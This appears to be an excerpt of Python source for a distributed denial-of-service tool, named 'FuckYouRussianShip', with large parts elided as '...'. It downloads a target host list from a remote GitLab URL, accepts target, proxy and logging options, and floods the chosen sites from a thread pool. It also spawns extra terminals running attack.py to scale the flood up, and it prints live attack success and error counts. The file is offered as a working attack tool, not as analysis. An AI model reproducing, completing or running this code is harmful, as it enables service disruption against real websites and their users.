...
class FuckYouRussianShip:
    ...
    def __init__(self):
        ...
        try:
            self.HOSTS = json.loads(requests.get(
                "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
        except:
            sleep(5)
            self.HOSTS = json.loads(requests.get(
                "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
    ...
    def create_parser(self):
        ...
        parser_obj.add_argument(
            "-n", "--no-clear", dest="no_clear", action='store_true')
        parser_obj.add_argument("-p", "--proxy-view",
                                dest="proxy_view", action='store_true')
        parser_obj.add_argument(
            "-t", "--targets", dest="targets", nargs='+', default=[])
        parser_obj.set_defaults(verbose=False)
        parser_obj.add_argument("-lo", "--logger-output", dest="logger_output")
        parser_obj.add_argument(
            "-lr", "--logger-results", dest="logger_results")
        parser_obj.add_argument(
            "-gc", "--use-gc", dest="use_gc", action='store_true')
    ...
    def mainth(self):
        ...
        while True:
            ...
            try:
                site = unquote(choice(self.targets)
                               if self.targets else data['site']['page'])
            except BaseException as exc:
                sleep(5)
                continue
    ...
    def print_statistic():
        ...
        while True:
            if len(statistic.keys()):
                print(
                    f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
                headers = ['Url',
                           '1-- status',
                           '2-- status',
                           '3-- status',
...
def attacker_threading(threads_count, worker_func):
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        future_tasks = [executor.submit(worker_func)
...
def generation_process(part, terminal_add):
    if platform.system() == "Linux":
        subprocess.call(
            f'xterm -e python attack.py {part} {terminal_add} &', shell=True)
    else:
        subprocess.call(
            f'start python attack.py {part} {terminal_add}', shell=True)
...
if __name__ == '__main__':
    while True:
        ...
        if attacker.threads <= 500:
            ...
            start_multi_terminals(parts, terminal_additional,
                                  first_part, attacker.mainth)
